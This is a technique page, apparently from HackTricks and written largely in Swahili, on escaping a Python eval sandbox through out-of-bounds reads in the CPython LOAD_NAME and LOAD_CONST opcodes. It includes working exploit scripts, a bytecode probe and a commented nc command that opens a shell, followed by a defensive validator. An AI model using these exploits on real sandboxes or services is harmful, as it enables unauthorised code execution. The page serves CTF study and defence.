# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**Taarifa hii ilichukuliwa** [**kutoka kwa andiko hili**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Tunaweza kutumia kipengele cha OOB read katika LOAD_NAME / LOAD_CONST opcode kupata alama fulani katika kumbukumbu. Hii inamaanisha kutumia hila kama `(a, b, c, ... mamia ya alama ..., __getattribute__) ikiwa [] vinginevyo [].__getattribute__(...)` kupata alama (kama jina la kazi) unayotaka.

Kisha tengeneza tu exploit yako.

### Overview <a href="#overview-1" id="overview-1"></a>

Msimbo wa chanzo ni mfupi sana, unajumuisha mistari 4 tu!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Unaweza kuingiza msimbo wa Python wa kawaida, na utaandikwa kuwa [Python code object](https://docs.python.org/3/c-api/code.html). Hata hivyo, `co_consts` na `co_names` za kitu hicho cha msimbo zitabadilishwa kuwa tuple tupu kabla ya kutathmini kitu hicho cha msimbo.

Hivyo katika njia hii, kila usemi unao na consts (mfano, nambari, nyuzi n.k.) au majina (mfano, mabadiliko, kazi) yanaweza kusababisha makosa ya segmentation mwishoni.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Segfault inatokea vipi?

Tuanzie na mfano rahisi, `[a, b, c]` inaweza kuandikwa kuwa bytecode ifuatayo.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Lakini je, ni nini kitakachotokea ikiwa `co_names` itakuwa tuple tupu? Opcode ya `LOAD_NAME 2` bado inatekelezwa, na inajaribu kusoma thamani kutoka kwa anwani hiyo ya kumbukumbu ambayo awali ilipaswa kuwa. Ndio, hii ni "kipengele" cha kusoma nje ya mipaka.

Dhana kuu ya suluhisho ni rahisi. Opcode zingine katika CPython kama `LOAD_NAME` na `LOAD_CONST` zina udhaifu (?) kwa kusoma nje ya mipaka.

Zinapata kitu kutoka kwa index `oparg` kutoka kwa tuple ya `consts` au `names` (hivyo ndivyo `co_consts` na `co_names` zinavyoitwa kwa ndani). Tunaweza kurejelea kipande kifupi kuhusu `LOAD_CONST` ili kuona kile CPython inachofanya wakati inashughulikia opcode ya `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Kwa njia hii tunaweza kutumia kipengele cha OOB kupata "jina" kutoka kwa ofset ya kumbukumbu isiyo na mpangilio. Ili kuhakikisha jina lililo nayo na ofset yake ni ipi, jaribu tu `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Na unaweza kupata kitu katika takriban oparg > 700. Unaweza pia kujaribu kutumia gdb kuangalia mpangilio wa kumbukumbu bila shaka, lakini sidhani kama itakuwa rahisi zaidi?

### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Mara tu tunapopata hizo ofset muhimu za majina / consts, tunawezaje kupata jina / const kutoka kwa ofset hiyo na kulitumia? Hapa kuna hila kwako:\
Tuchukulie tunaweza kupata jina la `__getattribute__` kutoka ofset 5 (`LOAD_NAME 5`) na `co_names=()`, kisha fanya mambo yafuatayo:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Kumbuka kwamba si lazima kuipa jina `__getattribute__`, unaweza kuipa jina fupi zaidi au la ajabu zaidi

Unaweza kuelewa sababu nyuma yake kwa kutazama bytecode yake:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Kumbuka kwamba `LOAD_ATTR` pia inapata jina kutoka `co_names`. Python inachukua majina kutoka kwa ofset sawa ikiwa jina ni sawa, hivyo `__getattribute__` ya pili bado inachukuliwa kutoka ofset=5. Kwa kutumia kipengele hiki tunaweza kutumia jina lolote mara jina likiwa katika kumbukumbu karibu.

Kwa ajili ya kuzalisha nambari inapaswa kuwa rahisi:

- 0: si \[\[]]
- 1: si \[]
- 2: (si \[]) + (si \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Sikutumia consts kutokana na kikomo cha urefu.

Kwanza hapa kuna script ya kutusaidia kupata ofset hizo za majina.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Na yafuatayo ni kwa ajili ya kuzalisha exploit halisi ya Python.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Inafanya mambo yafuatayo, kwa ajili ya zile nyuzi tunazozipata kutoka kwa njia ya `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Maelezo ya toleo na opcodes zilizoathiriwa (Python 3.11–3.13)

- CPython bytecode opcodes bado huorodhesha katika `co_consts` na `co_names` tuples kwa kutumia operandi za nambari. Ikiwa mshambuliaji anaweza kulazimisha tuples hizi kuwa tupu (au ndogo kuliko kiashiria cha juu zaidi kinachotumika na bytecode), mfasiri atasoma kumbukumbu za nje ya mipaka kwa ajili ya kiashiria hicho, na kutoa kiashiria cha PyObject kisichokuwa na mpangilio kutoka kwa kumbukumbu ya karibu. OpCodes zinazohusiana zinajumuisha angalau:
- `LOAD_CONST consti` → inasoma `co_consts[consti]`.
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → inasoma majina kutoka `co_names[...]` (kwa 3.11+ kumbuka `LOAD_ATTR`/`LOAD_GLOBAL` hifadhi bendera za kiashiria katika bit ya chini; kiashiria halisi ni `namei >> 1`). Tazama nyaraka za disassembler kwa maana sahihi kwa kila toleo. [Python dis docs].
- Python 3.11+ ilianzisha caches za kubadilika/inline ambazo zinaongeza entries za siri za `CACHE` kati ya maagizo. Hii haibadilishi primitive ya OOB; inamaanisha tu kwamba ikiwa unaunda bytecode kwa mikono, lazima uhesabu entries hizo za cache unapojenga `co_code`.

Mwanzo wa vitendo: mbinu katika ukurasa huu inaendelea kufanya kazi kwenye CPython 3.11, 3.12 na 3.13 unapoweza kudhibiti kitu cha msimbo (kwa mfano, kupitia `CodeType.replace(...)`) na kupunguza `co_consts`/`co_names`.

### Scanner ya haraka kwa viashiria vya OOB vinavyofaa (3.11+/3.12+ inayoendana)

Ikiwa unapendelea kuchunguza vitu vya kuvutia moja kwa moja kutoka kwa bytecode badala ya kutoka kwa chanzo cha kiwango cha juu, unaweza kuunda vitu vya msimbo vidogo na kulazimisha viashiria. Msaada hapa chini huingiza kiotomatiki caches za inline inapohitajika.
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notes
- Ili kuchunguza majina badala yake, badilisha `LOAD_CONST` kwa `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` na urekebishe matumizi yako ya stack ipasavyo.
- Tumia `EXTENDED_ARG` au bytes nyingi za `arg` kufikia indexes >255 ikiwa inahitajika. Unapojenga na `dis` kama ilivyo hapo juu, unadhibiti tu byte ya chini; kwa indexes kubwa, jenga bytes za raw mwenyewe au gawanya shambulio hilo kwenye loads nyingi.

### Mchoro wa RCE wa bytecode pekee (co_consts OOB → builtins → eval/input)

Mara tu unapokuwa umepata index ya `co_consts` inayorejelea moduli ya builtins, unaweza kujenga upya `eval(input())` bila `co_names` kwa kudhibiti stack:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Hii mbinu ni muhimu katika changamoto zinazokupa udhibiti wa moja kwa moja juu ya `co_code` wakati ukilazimisha `co_consts=()` na `co_names=()` (kwa mfano, BCTF 2024 “awpcode”). Inakwepa hila za kiwango cha chanzo na inahifadhi ukubwa wa payload kuwa mdogo kwa kutumia operesheni za bytecode stack na wajenzi wa tuple.

### Ukaguzi wa kinga na mipango ya kupunguza hatari kwa sandboxes

Ikiwa unandika “sandbox” ya Python inayokusanya/inafanya tathmini ya msimbo usioaminika au inashughulikia vitu vya msimbo, usitegemee CPython kuangalia mipaka ya viashiria vya tuple vinavyotumiwa na bytecode. Badala yake, thibitisha vitu vya msimbo mwenyewe kabla ya kuvitekeleza.

Practical validator (inakataza ufikiaji wa OOB kwa co_consts/co_names)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Mawazo mengine ya kupunguza
- Usiruhusu `CodeType.replace(...)` isiyoaminika kwenye pembejeo zisizoaminika, au ongeza ukaguzi mkali wa muundo kwenye kitu cha msimbo kinachotokana.
- Fikiria kuendesha msimbo usioaminika katika mchakato tofauti na sandboxing ya kiwango cha OS (seccomp, vitu vya kazi, kontena) badala ya kutegemea semantics za CPython.

## Marejeleo

- Andiko la Splitline’s HITCON CTF 2022 “V O I D” (chanzo cha mbinu hii na mnyororo wa juu wa unyakuzi): https://blog.splitline.tw/hitcon-ctf-2022/
- Nyaraka za disassembler za Python (semantics za viashiria kwa LOAD_CONST/LOAD_NAME/nk., na 3.11+ `LOAD_ATTR`/`LOAD_GLOBAL` bendera za chini): https://docs.python.org/3.13/library/dis.html
{{#include ../../../banners/hacktricks-training.md}}
